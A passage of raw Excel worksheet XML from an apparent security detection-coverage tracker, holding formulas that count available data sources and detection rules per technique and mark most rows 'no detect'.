      <c r="A198" t="s">
        <v>1160</v>
      </c>
      <c r="B198" t="s">
        <v>1160</v>
      </c>
      <c r="C198" t="s">
        <v>86</v>
      </c>
      <c r="D198" t="s">
        <v>10</v>
      </c>
      <c r="E198" t="s">
        <v>467</v>
      </c>
      <c r="F198" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G198" s="9" cm="1">
        <f t="array" ref="G198">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H198" s="9" cm="1">
        <f t="array" ref="H198">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I198" s="9" t="str" cm="1">
        <f t="array" ref="I198">IF(SUM(IF($C198=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C198=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J198" s="9" t="str" cm="1">
        <f t="array" ref="J19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98" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M198" s="9" cm="1">
        <f t="array" ref="M198">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N198" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O198" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P198" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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98" t="s">
        <v>368</v>
      </c>
      <c r="U198" t="s">
        <v>1161</v>
      </c>
      <c r="V198" t="s">
        <v>1162</v>
      </c>
      <c r="W198" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="199" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A199" t="s">
        <v>1163</v>
      </c>
      <c r="B199" t="s">
        <v>1163</v>
      </c>
      <c r="C199" t="s">
        <v>59</v>
      </c>
      <c r="D199" t="s">
        <v>10</v>
      </c>
      <c r="E199" t="s">
        <v>1164</v>
      </c>
      <c r="F199" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G199" s="9" cm="1">
        <f t="array" ref="G199">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H199" s="9" cm="1">
        <f t="array" ref="H199">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I199" s="9" t="str" cm="1">
        <f t="array" ref="I199">IF(SUM(IF($C199=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C199=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J199" s="9" t="str" cm="1">
        <f t="array" ref="J19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199" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M199" s="9" cm="1">
        <f t="array" ref="M199">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N199" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O199" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P199" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S19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199" t="s">
        <v>1165</v>
      </c>
      <c r="U199" t="s">
        <v>1166</v>
      </c>
      <c r="V199" t="s">
        <v>1167</v>
      </c>
      <c r="W199" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="200" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A200" t="s">
        <v>1168</v>
      </c>
      <c r="B200" t="s">
        <v>1168</v>
      </c>
      <c r="C200" t="s">
        <v>185</v>
      </c>
      <c r="D200" t="s">
        <v>8</v>
      </c>
      <c r="E200" t="s">
        <v>434</v>
      </c>
      <c r="F200" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G200" s="9" cm="1">
        <f t="array" ref="G200">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H200" s="9" cm="1">
        <f t="array" ref="H200">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I200" s="9" t="str" cm="1">
        <f t="array" ref="I200">IF(SUM(IF($C200=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C200=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J200" s="9" t="str" cm="1">
        <f t="array" ref="J20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00" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M200" s="9" cm="1">
        <f t="array" ref="M200">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N200" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O200" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P200" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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00" t="s">
        <v>368</v>
      </c>
      <c r="U200" t="s">
        <v>1169</v>
      </c>
      <c r="V200" t="s">
        <v>442</v>
      </c>
      <c r="W200" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="201" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A201" t="s">
        <v>1170</v>
      </c>
      <c r="B201" t="s">
        <v>1170</v>
      </c>
      <c r="C201" t="s">
        <v>47</v>
      </c>
      <c r="D201" t="s">
        <v>10</v>
      </c>
      <c r="E201" t="s">
        <v>467</v>
      </c>
      <c r="F201" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G201" s="9" cm="1">
        <f t="array" ref="G201">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H201" s="9" cm="1">
        <f t="array" ref="H201">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I201" s="9" t="str" cm="1">
        <f t="array" ref="I201">IF(SUM(IF($C201=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C201=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J201" s="9" t="str" cm="1">
        <f t="array" ref="J20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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M201" s="9" cm="1">
        <f t="array" ref="M201">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N201" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O201" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P201" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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01" t="s">
        <v>368</v>
      </c>
      <c r="U201" t="s">
        <v>1171</v>
      </c>
      <c r="V201" t="s">
        <v>1172</v>
      </c>
      <c r="W201" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="202" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A202" t="s">
        <v>1173</v>
      </c>
      <c r="B202" t="s">
        <v>1173</v>
      </c>
      <c r="C202" t="s">
        <v>206</v>
      </c>
      <c r="D202" t="s">
        <v>8</v>
      </c>
      <c r="E202" t="s">
        <v>434</v>
      </c>
      <c r="F202" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G202" s="9" cm="1">
        <f t="array" ref="G202">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H202" s="9" cm="1">
        <f t="array" ref="H202">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I202" s="9" t="str" cm="1">
        <f t="array" ref="I202">IF(SUM(IF($C202=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C202=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J202" s="9" t="str" cm="1">
        <f t="array" ref="J20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02" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M202" s="9" cm="1">
        <f t="array" ref="M202">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N202" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O202" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P202" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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02" t="s">
        <v>425</v>
      </c>
      <c r="U202" t="s">
        <v>1174</v>
      </c>
      <c r="V202" t="s">
        <v>1175</v>
      </c>
      <c r="W202" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="203" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A203" t="s">
        <v>1176</v>
      </c>
      <c r="B203" t="s">
        <v>1176</v>
      </c>
      <c r="C203" t="s">
        <v>178</v>
      </c>
      <c r="D203" t="s">
        <v>10</v>
      </c>
      <c r="E203" t="s">
        <v>467</v>
      </c>
      <c r="F203" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G203" s="9" cm="1">
        <f t="array" ref="G203">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H203" s="9" cm="1">
        <f t="array" ref="H203">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I203" s="9" t="str" cm="1">
        <f t="array" ref="I203">IF(SUM(IF($C203=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C203=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J203" s="9" t="str" cm="1">
        <f t="array" ref="J20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03" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M203" s="9" cm="1">
        <f t="array" ref="M203">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N203" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O203" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P203" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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03" t="s">
        <v>368</v>
      </c>
      <c r="U203" t="s">
        <v>1177</v>
      </c>
      <c r="V203" t="s">
        <v>1178</v>
      </c>
      <c r="W203" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="204" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A204" t="s">
        <v>1179</v>
      </c>
      <c r="B204" t="s">
        <v>1179</v>
      </c>
      <c r="C204" t="s">
        <v>213</v>
      </c>
      <c r="D204" t="s">
        <v>6</v>
      </c>
      <c r="E204" t="s">
        <v>1180</v>
      </c>
      <c r="F204" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G204" s="9" cm="1">
        <f t="array" ref="G204">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H204" s="9" cm="1">
        <f t="array" ref="H204">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I204" s="9" t="str" cm="1">
        <f t="array" ref="I204">IF(SUM(IF($C204=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C204=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J204" s="9" cm="1">
        <f t="array" ref="J20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204" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M204" s="9" cm="1">
        <f t="array" ref="M204">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N204" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O204" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P204" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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04" t="s">
        <v>386</v>
      </c>
      <c r="U204" t="s">
        <v>1181</v>
      </c>
      <c r="V204" t="s">
        <v>1182</v>
      </c>
      <c r="W204" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="205" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A205" t="s">
        <v>1179</v>
      </c>
      <c r="B205" t="s">
        <v>1183</v>
      </c>
      <c r="C205" t="s">
        <v>273</v>
      </c>
      <c r="D205" t="s">
        <v>6</v>
      </c>
      <c r="E205" t="s">
        <v>463</v>
      </c>
      <c r="F205" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G205" s="9" cm="1">
        <f t="array" ref="G205">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H205" s="9" t="str" cm="1">
        <f t="array" ref="H205">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I205" s="9" t="str" cm="1">
        <f t="array" ref="I205">IF(SUM(IF($C205=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C205=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J205" s="9" t="str" cm="1">
        <f t="array" ref="J20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05" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M205" s="9" cm="1">
        <f t="array" ref="M205">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N205" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O205" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P205" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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05" t="s">
        <v>386</v>
      </c>
      <c r="U205" t="s">
        <v>272</v>
      </c>
      <c r="V205" t="s">
        <v>1184</v>
      </c>
      <c r="W205" t="b">
        <v>1</v>
      </c>
      <c r="X205" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="206" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A206" t="s">
        <v>1179</v>
      </c>
      <c r="B206" t="s">
        <v>1185</v>
      </c>
      <c r="C206" t="s">
        <v>1186</v>
      </c>
      <c r="D206" t="s">
        <v>6</v>
      </c>
      <c r="E206" t="s">
        <v>1180</v>
      </c>
      <c r="F206" s="9">
        <f t="shared" si="3"/>
        <v>4</v>
      </c>
      <c r="G206" s="9" cm="1">
        <f t="array" ref="G206">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H206" s="9" t="str" cm="1">
        <f t="array" ref="H206">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I206" s="9" t="str" cm="1">
        <f t="array" ref="I206">IF(SUM(IF($C206=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C206=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J206" s="9" t="str" cm="1">
        <f t="array" ref="J20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06" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M206" s="9" cm="1">
        <f t="array" ref="M206">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N206" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O206" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P206" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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06" t="s">
        <v>386</v>
      </c>
      <c r="U206" t="s">
        <v>1187</v>
      </c>
      <c r="W206" t="b">
        <v>1</v>
      </c>
      <c r="X206" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="207" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A207" t="s">
        <v>1188</v>
      </c>
      <c r="B207" t="s">
        <v>1188</v>
      </c>
      <c r="C207" t="s">
        <v>127</v>
      </c>
      <c r="D207" t="s">
        <v>3</v>
      </c>
      <c r="E207" t="s">
        <v>797</v>
      </c>
      <c r="F207" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G207" s="9" cm="1">
        <f t="array" ref="G207">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H207" s="9" cm="1">
        <f t="array" ref="H207">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I207" s="9" t="str" cm="1">
        <f t="array" ref="I207">IF(SUM(IF($C207=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C207=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J207" s="9" t="str" cm="1">
        <f t="array" ref="J20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07" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M207" s="9" cm="1">
